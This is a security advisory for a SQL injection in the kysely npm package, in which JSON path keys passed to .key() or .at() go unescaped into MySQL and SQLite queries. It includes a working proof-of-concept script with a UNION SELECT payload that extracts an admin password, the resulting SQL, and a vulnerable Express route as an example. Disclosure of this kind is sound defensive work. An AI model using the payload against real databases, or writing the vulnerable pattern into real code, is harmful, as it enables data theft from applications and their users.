# [H] SQL Injection via unsanitized JSON path keys when ignoring/silencing compilation errors or using `Kysely<any>`.

## Summary
Severity: High
Advisory: GHSA-wmrf-hv6w-mr66
CVE: CVE-2026-32763
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-wmrf-hv6w-mr66
Type: github-advisory

## Affected
- npm: `kysely` — affected >=0.26.0 <0.28.12

## Details
### Summary

Kysely through 0.28.11 has a SQL injection vulnerability in JSON path compilation for MySQL and SQLite dialects. The `visitJSONPathLeg()` function appends user-controlled values from `.key()` and `.at()` directly into single-quoted JSON path string literals (`'$.key'`) without escaping single quotes. An attacker can break out of the JSON path string context and inject arbitrary SQL.

This is inconsistent with `sanitizeIdentifier()`, which properly doubles delimiter characters for identifiers — both are non-parameterizable SQL constructs requiring manual escaping, but only identifiers are protected.

### Details

`visitJSONPath()` wraps JSON path in single quotes (`'$...'`), and `visitJSONPathLeg()` appends each key/index value via `this.append(String(node.value))` with no sanitization:

```javascript
// dist/cjs/query-compiler/default-query-compiler.js
visitJSONPath(node) {
    if (node.inOperator) {
        this.visitNode(node.inOperator);
    }
    this.append("'$");
    for (const pathLeg of node.pathLegs) {
        this.visitNode(pathLeg);        // Each leg appended without escaping
    }
    this.append("'");
}
visitJSONPathLeg(node) {
    const isArrayLocation = node.type === 'ArrayLocation';
    this.append(isArrayLocation ? '[' : '.');
    this.append(String(node.value));    // <-- NO single quote escaping
    if (isArrayLocation) {
        this.append(']');
    }
}
```

Contrast with `sanitizeIdentifier()` in the same file, which properly doubles delimiter characters:

```javascript
sanitizeIdentifier(identifier) {
    const leftWrap = this.getLeftIdentifierWrapper();
    const rightWrap = this.getRightIdentifierWrapper();
    let sanitized = '';
    for (const c of identifier) {
        sanitized += c;
        if (c === leftWrap) { sanitized += leftWrap; }
        else if (c === rightWrap) { sanitized += rightWrap; }
    }
    return sanitized;
}
```

Both identifiers and JSON path keys are non-parameterizable SQL constructs that require manual escaping. Identifiers are protected; JSON path values are not.

PostgreSQL is **not affected**. The branching happens in `JSONPathBuilder.#createBuilderWithPathLeg()` (`json-path-builder.js`):

- **MySQL/SQLite** operators (`->$`, `->>$`) produce a `JSONPathNode` traversal → `visitJSONPathLeg()` concatenates the key directly into a single-quoted JSON path string (`'$.key'`) — **vulnerable**, no escaping.
- **PostgreSQL** operators (`->`, `->>`) produce a `JSONOperatorChainNode` traversal → `ValueNode.createImmediate(value)` → `appendImmediateValue()` → `appendStringLiteral()` → **`sanitizeStringLiteral()` doubles single quotes** (`'` → `''`), generating chained operators (`"col"->>'city'`). Injection payload becomes a harmless string literal.

Same `.key()` call, different internal node creation depending on the operator type. The PostgreSQL path reuses the existing string literal sanitization; the MySQL/SQLite JSON path construction bypasses it entirely.

### PoC

End-to-end proof against a real SQLite database (Kysely 0.28.11 + better-sqlite3):

```javascript
const Database = require('better-sqlite3');
const { Kysely, SqliteDialect } = require('kysely');

const sqliteDb = new Database(':memory:');
sqliteDb.exec(`
  CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, profile TEXT);
  INSERT INTO users VALUES (1, 'alice', '{"city": "Seoul", "age": 30}');
  INSERT INTO users VALUES (2, 'bob', '{"city": "Tokyo", "age": 25}');
  CREATE TABLE admin (id INTEGER PRIMARY KEY, password TEXT);
  INSERT INTO admin VALUES (1, 'SUPER_SECRET_PASSWORD_123');
`);

const db = new Kysely({ dialect: new SqliteDialect({ database: sqliteDb }) });

async function main() {
  // Safe usage
  const safe = await db
    .selectFrom('users')
    .select(eb => eb.ref('profile', '->>$').key('city').as('city'))
    .execute();
  console.log("Safe:", safe);
  // [ { city: 'Seoul' }, { city: 'Tokyo' } ]

  // Injection via .key() — exfiltrate admin password
  const malicious = `city' as "city" from "users" UNION SELECT password FROM admin -- `;
  const attack = await db
    .selectFrom('users')
    .select(eb => eb.ref('profile', '->>$').key(malicious).as('city'))
    .execute();
  console.log("Injected:", attack);
  // [ { city: 'SUPER_SECRET_PASSWORD_123' }, { city: 'Seoul' }, { city: 'Tokyo' } ]
}
main();
```

The payload includes `as "city" from "users"` to complete the first SELECT before the UNION. The `--` comments out the trailing `' as "city" from "users"` appended by Kysely.

Generated SQL:

```sql
select "profile"->>'$.city' as "city" from "users" UNION SELECT password FROM admin -- ' as "city" from "users"
```

### Realistic application pattern

```javascript
app.get('/api/products', async (req, res) => {
  const field = req.query.field || 'name';
  const products = await db
    .selectFrom('products')
    .select(eb => eb.ref('metadata', '->>$').key(field).as('value'))
    .execute();
  res.json(products);
});
```

Dynamic JSON field selection is a common pattern in search APIs, GraphQL resolvers, and admin panels that expose JSON column data.

### Suggested fix

Escape single quotes in JSON path values within `visitJSONPathLeg()`, similar to how `sanitizeIdentifier()` doubles delimiter characters. Alternatively, validate that JSON path keys contain only safe characters. The direction of the fix is left to the maintainers.

### Impact

**SQL Injection (CWE-89)** — An attacker can inject arbitrary SQL via crafted JSON key names passed to `.key()` or `.at()`, enabling UNION-based data exfiltration from any database table. MySQL and SQLite dialects are affected. PostgreSQL is not affected.

## References
- https://github.com/kysely-org/kysely/security/advisories/GHSA-wmrf-hv6w-mr66
- https://nvd.nist.gov/vuln/detail/CVE-2026-32763
- https://github.com/kysely-org/kysely/commit/0a602bff2f442f6c26d5e047ca8f8715179f6d24
- https://github.com/kysely-org/kysely
- https://github.com/kysely-org/kysely/releases/tag/v0.28.12
